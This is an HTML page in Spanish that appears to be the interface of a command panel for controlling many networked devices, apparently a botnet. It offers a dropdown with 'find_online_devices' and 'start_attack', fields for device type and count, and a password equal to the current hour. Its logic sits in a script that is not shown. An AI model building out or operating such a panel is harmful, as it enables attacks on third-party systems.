<!DOCTYPE html>
<html lang="es">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Dashboard</title>
    <script src="https://cdn.jsdelivr.net/npm/js-sha512"></script>
    <script src="main.js"></script>
    <link rel="stylesheet" href="style.css">
</head>
<body>

    <div class="table-container">

        <table>

            <tr>
                <td>
                    <div class="containers">
                        <div class="tooltip">
                            <label for="contra">
                                INTRODUCIR CONTRASEÑA
                                <br/>
                                <input id="contra" type="number" min="0" max="24" placeholder="Contraseña">
                                <span class="tooltiptext">Ejemplo => <br/>Hora: 14:47, Contraseña: 14</span>
                            </label>
                        </div>
                    </div>
                </td>
                <td>
                    <div class="containers">
                        <label for="busqueda">
                            SELECCIONAR COMANDO
                            <input type="text" id="busqueda" placeholder="Buscar comando...">

                            <br/>

                            <select id="opciones">
                                <option value="find_online_devices" selected>find_online_devices</option>
                                <option value="start_attack">start_attack</option>
                                <option value="placeholder_command">placeholder_command</option>
                                <option value="placeholder_command2">placeholder_command2</option>
                            </select>
                        </label>
                    </div>
                </td>
            </tr>

            <tr>
                <td>
                    <div class="containers" id="divArgumentos">
                        <label for="deviceType">TIPO DE DISPOSITIVO</label>
                        <input type="text" id="deviceType" placeholder="Introduce el tipo de dispositivo">

                        <br>

                        <label for="deviceAmount">CANTIDAD DE DISPOSITIVOS</label>
                        <input type="text" id="deviceAmount" placeholder="Introduce la cantidad">
                    </div>
                </td>
                <td>
                    <div class="containers">
                        <button id="buttonEnviarComando" disabled>ENVIAR COMANDO</button>
                        <p id="buttonTimer" style="visibility: hidden">0</p>
                        <a href="command_list.html" target="_blank">
                            <button id="buttonListaComandos">LISTA DE COMANDOS</button>
                        </a>
                        <br/>
                        <button id="buttonConexion">CONECTAR</button>
                    </div>
                </td>
            </tr>

        </table>

    </div>

</body>
</html>
